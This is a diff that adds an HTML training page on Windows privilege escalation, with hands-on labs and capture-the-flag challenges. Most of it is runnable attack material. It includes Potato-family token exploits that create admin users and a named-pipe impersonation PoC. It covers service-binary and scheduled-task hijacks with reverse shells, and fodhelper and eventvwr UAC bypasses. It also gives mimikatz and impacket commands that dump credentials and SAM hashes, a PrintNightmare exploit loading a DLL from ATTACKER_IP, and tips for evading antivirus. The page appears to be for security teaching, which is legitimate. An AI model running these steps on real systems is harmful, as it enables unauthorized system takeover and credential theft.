+              <li>Trigger the application to load your DLL and verify code execution.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: JuicyPotato / GodPotato</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit SeImpersonatePrivilege using JuicyPotato or GodPotato when PrintSpoofer fails or is detected.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Verify SeImpersonatePrivilege
+whoami /priv | findstr "SeImpersonate"
+
+# JuicyPotato (Windows Server 2016/2019)
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\output.txt" -t *
+
+# Specify CLSID (required for some OS versions)
+# Find valid CLSIDs at: https://ohpe.it/juicy-potato/CLSID/
+.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker Hacker123! /add" -t * -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
+
+# GodPotato (works on Windows Server 2012-2022)
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c type C:\flag.txt"
+
+# SweetPotato (alternative)
+.\SweetPotato.exe -e EfsRpc -p C:\temp\reverse.exe</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Test PrintSpoofer first — if it fails, determine why (patched Spooler, no named pipe).</li>
+              <li>Try JuicyPotato with different CLSIDs until you find a working one.</li>
+              <li>Use GodPotato as a more universal alternative.</li>
+              <li>Compare the techniques: which works on which OS versions?</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Named Pipe Impersonation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Create a named pipe server, trick a privileged process into connecting, and impersonate its token.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// named_pipe_impersonate.c — Named pipe impersonation PoC
+// Compile: cl.exe named_pipe_impersonate.c advapi32.lib /Fe:pipe_impersonate.exe
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    // Step 1: Create a named pipe
+    HANDLE hPipe = CreateNamedPipeA(
+        "\\\\.\\pipe\\privesc_lab",
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+        1, 1024, 1024, 0, NULL);
+
+    if (hPipe == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateNamedPipe failed: %lu\n", GetLastError());
+        return 1;
+    }
+    printf("[*] Named pipe created: \\\\.\\pipe\\privesc_lab\n");
+    printf("[*] Waiting for connection...\n");
+
+    // Step 2: Wait for a privileged client to connect
+    ConnectNamedPipe(hPipe, NULL);
+    printf("[+] Client connected!\n");
+
+    // Step 3: Impersonate the client
+    if (ImpersonateNamedPipeClient(hPipe)) {
+        printf("[+] Impersonation successful!\n");
+
+        // Check who we are now
+        char username[256];
+        DWORD len = sizeof(username);
+        GetUserNameA(username, &amp;len);
+        printf("[+] Running as: %s\n", username);
+
+        // Spawn a shell with the impersonated token
+        STARTUPINFOA si = { .cb = sizeof(si) };
+        PROCESS_INFORMATION pi;
+        CreateProcessAsUserA(NULL, "cmd.exe", NULL, NULL, NULL,
+            FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);
+
+        RevertToSelf();
+    }
+
+    CloseHandle(hPipe);
+    return 0;
+}</code></pre>
+<pre><code class="language-powershell"># Trigger a SYSTEM process to connect to your pipe:
+# Use SpoolSample or printerbug to coerce authentication
+# Or: trigger a service to write to your named pipe path</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compile and run the named pipe server.</li>
+              <li>From another terminal, connect as a different user: <code>echo test > \\.\pipe\privesc_lab</code></li>
+              <li>Coerce a SYSTEM service to connect using the Printer Bug or EFS abuse.</li>
+              <li>Verify impersonation succeeds and you can spawn a SYSTEM shell.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Writable Service Binary Path</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Replace a service executable with a payload when the binary path is writable by your user.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Find services with writable binary paths
+Get-CimInstance Win32_Service | ForEach-Object {
+    $path = ($_.PathName -replace '"','') -replace '\s+/.*','' -replace '\s+-.*',''
+    if (Test-Path $path) {
+        $acl = Get-Acl $path -ErrorAction SilentlyContinue
+        $writable = $acl.Access | Where-Object {
+            $_.FileSystemRights -match "Write|FullControl|Modify" -and
+            $_.IdentityReference -match "Users|Everyone|Authenticated"
+        }
+        if ($writable) {
+            [PSCustomObject]@{
+                Service = $_.Name
+                Path    = $path
+                RunAs   = $_.StartName
+                Perm    = $writable.FileSystemRights
+            }
+        }
+    }
+} | Format-Table -AutoSize
+
+# Step 2: Backup and replace
+copy "C:\VulnApp\service.exe" "C:\VulnApp\service.exe.bak"
+copy C:\temp\reverse.exe "C:\VulnApp\service.exe"
+
+# Step 3: Restart the service
+sc stop VulnService
+sc start VulnService</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Identify a service with a writable binary path using the PowerShell script above.</li>
+              <li>Backup the original binary before replacing.</li>
+              <li>Replace with your payload and restart the service.</li>
+              <li>Restore the original binary after getting your shell.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Scheduled Task Abuse</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Find and exploit scheduled tasks running as privileged users with writable script paths.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Enumerate scheduled tasks
+schtasks /query /fo LIST /v | findstr /i "Task Name\|Run As User\|Task To Run"
+
+# PowerShell — more detailed
+Get-ScheduledTask | ForEach-Object {
+    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
+    [PSCustomObject]@{
+        Name    = $_.TaskName
+        Path    = $_.TaskPath
+        RunAs   = $_.Principal.UserId
+        Action  = ($_.Actions | Select-Object -First 1).Execute
+        Args    = ($_.Actions | Select-Object -First 1).Arguments
+        Status  = $_.State
+    }
+} | Where-Object { $_.RunAs -match "SYSTEM|Administrator" } | Format-Table -AutoSize
+
+# Step 2: Check if the script/binary is writable
+$taskAction = "C:\Scripts\backup.ps1"
+icacls $taskAction
+
+# Step 3: Modify the script to include a payload
+Add-Content -Path $taskAction -Value "`nnet localgroup Administrators youruser /add"
+
+# Step 4: Wait for the task to run, or trigger it
+schtasks /run /tn "VulnTask"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find all scheduled tasks running as SYSTEM or Administrator.</li>
+              <li>Check if any task actions point to writable files or directories.</li>
+              <li>Inject a payload into the writable script.</li>
+              <li>Wait for or trigger the task and verify privilege escalation.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Credential Manager and DPAPI Extraction</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Extract stored credentials from Windows Credential Manager and decrypt DPAPI-protected secrets.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Check for stored credentials
+cmdkey /list
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# Step 2: Use runas with saved credentials
+runas /savecred /user:DOMAIN\admin cmd.exe
+
+# Step 3: Enumerate DPAPI master keys and credential blobs
+dir /a C:\Users\target\AppData\Local\Microsoft\Credentials\
+dir /a C:\Users\target\AppData\Roaming\Microsoft\Credentials\
+dir /a C:\Users\target\AppData\Roaming\Microsoft\Protect\</code></pre>
+<pre><code class="language-bash"># Step 4: Mimikatz — decrypt DPAPI credentials
+mimikatz.exe "sekurlsa::dpapi"           # dump DPAPI master keys from lsass
+mimikatz.exe "dpapi::cred /in:C:\Users\target\AppData\Local\Microsoft\Credentials\GUID"
+
+# Step 5: Offline DPAPI decryption with impacket
+impacket-dpapi masterkey -file MASTERKEY_FILE -sid USER_SID -password 'UserPassword'
+impacket-dpapi credential -file CREDENTIAL_BLOB -key DECRYPTED_MASTERKEY</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Check <code>cmdkey /list</code> for stored Windows credentials.</li>
+              <li>Enumerate DPAPI credential blobs and master key files.</li>
+              <li>Use mimikatz to dump DPAPI master keys from lsass memory.</li>
+              <li>Decrypt credential blobs to recover stored passwords.</li>
+              <li>Try offline decryption with impacket-dpapi using the user's password or the domain backup key.</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 13: SAM Database Extraction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Extract the SAM database using multiple methods and crack the local account password hashes.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Method 1: reg save (requires admin)
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+
+# Method 2: Volume Shadow Copy (bypass file locks)
+wmic shadowcopy call create Volume='C:\'
+# Find the shadow copy path
+vssadmin list shadows
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+
+# Method 3: mimikatz
+mimikatz.exe "token::elevate" "lsadump::sam"</code></pre>
+<pre><code class="language-bash"># Offline extraction and cracking
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# Crack NTLM hashes
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Extract SAM and SYSTEM hives using at least two different methods.</li>
+              <li>Transfer the hives to your attacker machine.</li>
+              <li>Dump hashes with <code>impacket-secretsdump</code>.</li>
+              <li>Crack the hashes with hashcat and verify by authenticating with the cracked password.</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- CTF TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Find the Privesc Vector</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You have a low-privilege shell on a Windows box. Find the privilege escalation vulnerability and read the flag from the Administrator's desktop.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You land as: YOURBOX\webuser (standard user)
+# Flag location: C:\Users\Administrator\Desktop\flag.txt
+# Run basic enumeration:
+whoami /priv
+net localgroup Administrators
+cmdkey /list
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. <code>cmdkey /list</code> shows stored credentials for the Administrator account.<br>
+            2. Use <code>runas /savecred /user:Administrator cmd.exe</code> to launch an admin shell.<br>
+            3. Read the flag: <code>type C:\Users\Administrator\Desktop\flag.txt</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Escalate from Service Account</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You've compromised an IIS web application and have a shell as the AppPool identity. Escalate to SYSTEM and read the flag at <code>C:\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Current context
+whoami
+# Output: iis apppool\defaultapppool
+
+whoami /priv
+# Note: SeImpersonatePrivilege — Enabled
+
+# The flag is only readable by SYSTEM
+icacls C:\flag.txt
+# Output: NT AUTHORITY\SYSTEM:(F)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> You have SeImpersonatePrivilege — this enables Potato-family attacks.<br>
+            <strong>Step 2:</strong> Transfer PrintSpoofer or GodPotato to the target.<br>
+            <strong>Step 3:</strong> Run <code>.\PrintSpoofer64.exe -i -c "cmd /c type C:\flag.txt"</code><br>
+            <strong>Step 4:</strong> If PrintSpoofer doesn't work (patched), try <code>.\GodPotato.exe -cmd "cmd /c type C:\flag.txt"</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Multi-Step Privilege Escalation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Chain multiple misconfigurations to go from a restricted user to SYSTEM. The flag is split — half in the local admin's documents, half in the SYSTEM-only directory.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Current user: YOURBOX\lowpriv (no special privileges)
+# Target 1: C:\Users\svc_admin\Documents\flag_part1.txt (readable by svc_admin)
+# Target 2: C:\Windows\System32\config\flag_part2.txt (readable by SYSTEM only)
+#
+# Environment hints:
+#   - There's a scheduled task running as svc_admin
+#   - svc_admin is a local administrator
+#   - Something interesting in the service configurations...
+#   - UAC is enabled but default settings
+
+whoami /all
+schtasks /query /fo LIST /v | findstr /i "svc_admin"
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\"</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1:</strong> A scheduled task runs <code>C:\Tasks\backup.ps1</code> every 5 minutes as svc_admin. Check if you can write to the script: <code>icacls C:\Tasks\backup.ps1</code><br>
+            <strong>Step 2:</strong> Modify backup.ps1 to copy flag_part1.txt to a readable location, or add a reverse shell. Wait for the task to execute.<br>
+            <strong>Step 3:</strong> Now as svc_admin (local admin), you need to bypass UAC. Use the fodhelper technique to get a high-integrity shell.<br>
+            <strong>Step 4:</strong> With admin access, find a service with SeImpersonatePrivilege or dump SAM hashes.<br>
+            <strong>Step 5:</strong> Use the SYSTEM-level access to read flag_part2.txt. Combine both parts for the full flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Find the Vulnerable Service</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A Windows service has weak permissions allowing low-privilege users to modify its configuration. Find it, change the binary path, and read the flag from <code>C:\flag.txt</code> (SYSTEM-only readable).</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURBOX\webuser (standard user)
+# Flag: C:\flag.txt (readable only by SYSTEM)
+
+# Enumerate services
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>$null
+# Or use PowerUp:
+Import-Module .\PowerUp.ps1
+Get-ModifiableService</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use accesschk to find services where "Authenticated Users" or "BUILTIN\Users" have SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS. Change the binPath to <code>cmd /c type C:\flag.txt > C:\temp\flag_out.txt</code>, restart the service, and read the output from the temp file.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: Token Impersonation Chain</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You have a shell as a SQL Server service account with SeImpersonatePrivilege. However, all Potato exploits are blocked by the AV. Find an alternative token impersonation method to reach SYSTEM.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Current context
+whoami
+# Output: NT SERVICE\MSSQLSERVER
+whoami /priv
+# SeImpersonatePrivilege — Enabled
+# SeAssignPrimaryTokenPrivilege — Enabled
+
+# All Potato binaries are flagged by AV. Find another way.
+# Flag: C:\Windows\System32\config\flag.txt (SYSTEM only)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Create a named pipe server and coerce a SYSTEM service to connect. Use the Printer Bug (<code>SpoolSample.exe</code>) to trigger the Spooler service to authenticate to your pipe. Alternatively, compile your own impersonation tool (see the named pipe lab) — custom compiled tools bypass signature-based AV. Another option: use <code>RoguePotato</code> which may not be in AV signatures.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: UAC Bypass Challenge</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You're a local admin but stuck at Medium integrity. UAC is blocking access to <code>C:\flag_admin.txt</code>. Bypass UAC to read the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Verify context
+whoami /groups | findstr "Level"
+# Mandatory Label\Medium Mandatory Level
+
+net localgroup Administrators
+# Your user is listed
+
+# The flag requires High integrity to read
+type C:\flag_admin.txt
+# Access denied</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Method 1 — fodhelper bypass:</strong> <code>reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c type C:\flag_admin.txt > C:\temp\flag.txt" /f</code>, then <code>reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f</code>, then run <code>fodhelper.exe</code>. Clean up the registry after.<br>
+            <strong>Method 2 — eventvwr:</strong> Same approach using <code>HKCU\Software\Classes\mscfile\shell\open\command</code> and launching <code>eventvwr.exe</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Credential Harvesting</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Stored credentials exist somewhere on this machine. Find them and use them to access the Administrator account. The flag is on the Administrator's desktop.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURBOX\lowuser
+# Enumerate for stored credentials
+cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
+dir /s /b C:\Users\*.xml C:\Users\*.txt C:\Users\*.ini 2>nul | findstr /i "pass cred"</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Check multiple locations: (1) <code>cmdkey /list</code> for Windows Credential Manager entries, (2) Winlogon registry for autologon credentials, (3) <code>C:\Windows\Panther\Unattend.xml</code> for deployment passwords (Base64 encoded), (4) PowerShell history: <code>type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>, (5) IIS config: <code>C:\inetpub\wwwroot\web.config</code>. One of these will contain the admin password.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Kernel Exploit Identification</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The system is an unpatched Windows Server 2016. No service misconfigurations exist. Find and exploit a kernel vulnerability to escalate to SYSTEM. The flag is at <code>C:\flag_kernel.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># System info
+systeminfo
+# Windows Server 2016, Build 14393 — no recent patches
+
+# No quick wins
+whoami /priv    # No SeImpersonatePrivilege
+cmdkey /list    # No stored credentials
+Get-ModifiableService  # Nothing</code></pre>
+<pre><code class="language-bash"># Enumerate potential kernel exploits
+# Transfer systeminfo output to attacker
+# Use Windows Exploit Suggester
+python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Run <code>systeminfo</code> and check the hotfix list. Use <code>wesng</code> (Windows Exploit Suggester - Next Generation) or <code>watson.exe</code> to identify missing patches. For Build 14393 without recent patches, look for CVE-2020-0796 (SMBGhost), CVE-2021-1732, or CVE-2021-36934 (HiveNightmare/SeriousSAM). Compile the exploit, transfer to the target, and run it. HiveNightmare is easiest: <code>icacls C:\Windows\System32\config\SAM</code> — if BUILTIN\Users has read access, copy the SAM hive from a shadow copy.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: PrintNightmare Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The Print Spooler service is running and the system is vulnerable to CVE-2021-1675/CVE-2021-34527 (PrintNightmare). Exploit it to add a local admin. The flag is at <code>C:\admin_flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Verify Print Spooler is running
+Get-Service -Name Spooler
+# Status: Running
+
+# Verify vulnerability (pre-auth check)
+# The system is missing KB5004945</code></pre>
+<pre><code class="language-bash"># From Linux — exploit with impacket
+# Host a malicious DLL on SMB share
+smbserver.py share /tmp/share -smb2support
+
+# Use the PoC
+python3 CVE-2021-1675.py 'domain.local/user:password@TARGET' \
+    '\\ATTACKER_IP\share\payload.dll'</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>PrintNightmare loads a DLL as SYSTEM via the Spooler service. Create a DLL that adds a local admin: <code>net user hacker Password123! /add &amp;&amp; net localgroup Administrators hacker /add</code>. Host it on an SMB share (impacket-smbserver). Point the exploit at the target. The DLL executes as SYSTEM, creating your admin account. Log in with the new account and read the flag. Clean up: remove the account and patch the system.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Scheduled Task Escalation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A scheduled task runs every 2 minutes as SYSTEM, executing a script from a writable location. Hijack it to read the flag from <code>C:\root_flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Enumerate scheduled tasks
+schtasks /query /fo LIST /v | findstr /i "Task Name\|Run As\|Task To Run\|Schedule"
+
+# You find:
+#   Task Name: \BackupTask
+#   Run As: SYSTEM
+#   Task To Run: C:\Scripts\daily_backup.ps1
+#   Schedule: Every 2 minutes
+
+# Check permissions
+icacls C:\Scripts\daily_backup.ps1
+# Output: BUILTIN\Users:(M)    ← Modify access!</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The script <code>C:\Scripts\daily_backup.ps1</code> is writable by BUILTIN\Users. Append your payload: <code>Add-Content C:\Scripts\daily_backup.ps1 "Copy-Item C:\root_flag.txt C:\temp\flag.txt; icacls C:\temp\flag.txt /grant Users:R"</code>. Wait 2 minutes for the task to execute. Then read <code>C:\temp\flag.txt</code>. Alternatively, append a reverse shell one-liner for interactive SYSTEM access.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
